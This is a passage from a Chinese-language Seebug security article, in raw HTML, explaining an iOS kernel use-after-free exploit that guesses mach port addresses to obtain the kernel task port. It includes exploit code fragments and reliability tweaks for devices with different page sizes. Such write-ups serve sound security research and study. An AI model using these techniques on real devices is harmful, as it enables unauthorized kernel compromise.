        <span class="n">mach_vm_deallocate</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="p">(</span><span class="n">mach_vm_address_t</span><span class="p">)</span><span class="n">ool_desc</span><span class="o">-&gt;</span><span class="n">address</span><span class="p">,</span> <span class="p">((</span><span class="n">ool_desc</span><span class="o">-&gt;</span><span class="n">count</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mh">0xfff</span><span class="p">)</span><span class="o">&amp;~</span><span class="mh">0xfff</span><span class="p">);</span>
    <span class="p">}</span>
</pre></div>


<p>利用代码中准备了0x20个UAF的port，然后从HOST_PRIV_PORT地址所在的zone的页面的中间部分开始猜测。</p>
<div class="codehilite"><pre><span></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n_middle_ports</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// guess the middle slots in the zone block:</span>
        <span class="n">mach_port_set_context</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">middle_ports</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">pages_base</span><span class="o">+</span><span class="p">(</span><span class="mh">0xa8</span> <span class="o">*</span> <span class="p">((</span><span class="n">n_ports_in_zone</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">n_middle_ports</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">i</span><span class="p">)));</span>
    <span class="p">}</span>

    <span class="n">mach_port_t</span> <span class="n">kernel_task_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n_ool_port_qs</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">mach_port_t</span> <span class="n">new_port</span> <span class="o">=</span> <span class="n">receive_ool_ports</span><span class="p">(</span><span class="n">ool_port_qs</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">host_priv</span><span class="p">,</span> <span class="n">pages_base</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">new_port</span> <span class="o">!=</span> <span class="n">MACH_PORT_NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">kernel_task_port</span> <span class="o">=</span> <span class="n">new_port</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</pre></div>


<p>增加准备的UAF的port的数量（最多可增加至port的zone的页面的容量）可以提高命中率。此外上述代码的一处改进是在接收消息前再分配一些port，由于HOST_PRIV_PORT所在的zone的页面可能存在被释放了的port地址，在copyout时候会导致panic，因此填补这些空洞可以提高稳定性。</p>
<h3><strong>设备差异性</strong></h3>
<p>iOS的内核堆是由zone来管理的，具体代码可以在zalloc.c中查看。每个zone对应的页面大小计算在zinit函数中，其中 ZONE_MAX_ALLOC_SIZE 固定为0x8000。</p>
<div class="codehilite"><pre><span></span>    <span class="k">if</span> <span class="p">(</span><span class="n">alloc</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">alloc</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>

    <span class="n">alloc</span> <span class="o">=</span> <span class="n">round_page</span><span class="p">(</span><span class="n">alloc</span><span class="p">);</span>
    <span class="n">max</span>   <span class="o">=</span> <span class="n">round_page</span><span class="p">(</span><span class="n">max</span><span class="p">);</span>

    <span class="n">vm_size_t</span> <span class="n">best_alloc</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
    <span class="n">vm_size_t</span> <span class="n">alloc_size</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">alloc_size</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">);</span> <span class="n">alloc_size</span> <span class="o">&lt;=</span> <span class="n">ZONE_MAX_ALLOC_SIZE</span><span class="p">;</span> <span class="n">alloc_size</span> <span class="o">+=</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ZONE_ALLOC_FRAG_PERCENT</span><span class="p">(</span><span class="n">alloc_size</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">ZONE_ALLOC_FRAG_PERCENT</span><span class="p">(</span><span class="n">best_alloc</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">best_alloc</span> <span class="o">=</span> <span class="n">alloc_size</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">alloc</span> <span class="o">=</span> <span class="n">best_alloc</span><span class="p">;</span>
</pre></div>


<p>值得注意的是PAGE_SIZE在iOS下可能是0x1000或0x4000，通过观察PAGE_SHIFT_CONST的初始化可以知道当RAM大于1GB（0x40000000）的时候PAGE_SIZE=0x4000，否则PAGE_SIZE=0x1000</p>
<div class="codehilite"><pre><span></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">v139</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v14</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0x40000000uLL</span> <span class="p">)</span>
      <span class="n">v15</span> <span class="o">=</span> <span class="mi">12</span><span class="p">;</span>
    <span class="k">else</span>
      <span class="n">v15</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">sub_FFFFFFF0074F2BE4</span><span class="p">(</span><span class="s">&quot;-use_hwpagesize&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v142</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
      <span class="n">v15</span> <span class="o">=</span> <span class="mi">12</span><span class="p">;</span>
    <span class="k">else</span>
      <span class="n">v15</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
    <span class="n">v14</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">PAGE_SHIFT_CONST</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</pre></div>


<p>iPhone 6s及之后的设备内存都是2GB，对应内核中的最小页面单位是16KB。根据zinit中的计算，ipc ports zone的页面大小是0x3000（6s之前的设备）或者0x4000（6s及之后的设备）。因此要猜测完整个页面的port需要0x49或者0x61个UAF的port。利用代码中的platform_detection也可以修改如下</p>
<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">platform_detection</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">hwmem</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">hwmem_size</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">sysctlbyname</span><span class="p">(</span><span class="s">&quot;hw.memsize&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hwmem</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hwmem_size</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hw memory is 0x%x bytes</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">hwmem</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hwmem</span> <span class="o">&gt;</span> <span class="mh">0x40000000</span><span class="p">)</span>
        <span class="n">n_ports_in_zone</span> <span class="o">=</span> <span class="mh">0x4000</span><span class="o">/</span><span class="mh">0xa8</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">n_ports_in_zone</span> <span class="o">=</span> <span class="mh">0x3000</span><span class="o">/</span><span class="mh">0xa8</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/174/">https://paper.seebug.org/174/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/173/"><span aria-hidden="true">&larr;</span> Chrome Extensions Probe</a>
    
    
      <a class="older-posts" href="/171/">Chromebackdoor - 浏览器后门工具 <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
